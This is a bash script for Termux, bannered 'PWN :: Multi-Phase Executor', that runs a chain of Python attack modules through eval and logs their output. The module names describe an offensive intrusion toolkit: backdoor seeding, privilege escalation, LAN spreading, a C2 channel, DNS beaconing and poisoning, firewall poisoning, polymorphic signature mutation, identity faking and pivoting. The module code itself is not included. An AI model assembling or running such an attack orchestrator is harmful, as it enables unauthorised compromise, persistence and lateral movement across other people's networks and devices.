#!/data/data/com.termux/files/usr/bin/bash

clear
echo -e "
 ██████╗ ██╗    ██╗███╗   ██╗
██╔═══██╗██║    ██║████╗  ██║
██║   ██║██║ █╗ ██║██╔██╗ ██║
██║   ██║██║███╗██║██║╚██╗██║
╚██████╔╝╚███╔███╔╝██║ ╚████║
 ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝

        PWN :: Multi-Phase Executor
        Timestamp: $(date)
──────────────────────────────────────────────
"

LOGFILE="logs/pwn_run_$(date +%s).log"
mkdir -p logs

run_phase() {
    local name="$1"
    local cmd="$2"
    local script=$(echo "$cmd" | awk '{print $2}')
    if [[ ! -f "$script" ]]; then
        echo -e "[✗] Skipping $name (missing): $script" | tee -a "$LOGFILE"
        return
    fi
    echo -e "\n[*] Phase: $name\n    > $cmd" | tee -a "$LOGFILE"
    eval "$cmd" >>"$LOGFILE" 2>&1 || echo -e "[✗] Error in $name\n" | tee -a "$LOGFILE"
}

run_background_phase() {
    local name="$1"
    local cmd="$2"
    local script=$(echo "$cmd" | awk '{print $2}')
    if [[ ! -f "$script" ]]; then
        echo -e "[✗] Skipping $name (missing): $script" | tee -a "$LOGFILE"
        return
    fi
    echo -e "\n[*] Phase: $name (Background)\n    > $cmd &" | tee -a "$LOGFILE"
    eval "$cmd" >>"$LOGFILE" 2>&1 &
}

# Sequential Phases
run_phase "CHIMERA"      "python ./phases/chimera_injector.py"
run_phase "ESCALATE"     "python ./phases/auto_escalator.py"
run_phase "INJECT"       "python ./phases/code_feedback.py"
run_phase "FORK"         "python ./phases/sandbox_forker.py"
run_phase "ENTROPY"      "python ./phases/entropy_harvester.py"
run_phase "BACKDOOR"     "python ./phases/backdoor_seed.py"
run_phase "SIGNATURE"    "python ./phases/sig_mutator.py"
run_phase "DRIFT"        "python ./phases/signal_drift.py"
run_phase "NEURAL"       "python ./phases/neural_mutator.py"
run_phase "AI"           "python ./phases/ai_loop.py"
run_background_phase "MIRROR" "python ./phases/phantom_mirror.py"
run_phase "INTEL"        "python ./phases/intel_aggregator.py"
run_background_phase "DECOY" "python ./phases/decoy_generator.py"
run_phase "IDENTITY"     "python ./phases/identity_faker.py"
run_phase "DNS"          "python ./phases/dns_beacon.py"
run_phase "FIREWALL"     "python ./phases/firewall_poison.py"
run_phase "POLYMORPH"    "python ./phases/polymorpher.py"
run_phase "SUBNET"       "python ./phases/lan_spread.py"
run_phase "KEYSTONE"     "python ./phases/keystone_injector.py"
run_phase "POSSESSION"   "python ./phases/phantom_c2.py && sleep 2 && python ./phases/ghost_probe.py"
run_phase "POISON"       "python ./phases/dns_poisoner.py"
run_phase "MIMIC"        "python ./phases/fingerprint_cloner.py"
run_phase "FEEDBACK"     "python ./phases/feedback_mutator.py"
run_phase "PIVOT"        "python ./phases/pivot_bootstrapper.py"
run_phase "KERNEL"       "python ./phases/kernel_probe.py"

echo -e "\n[✓] PWN execution complete. Logs saved to: $LOGFILE"
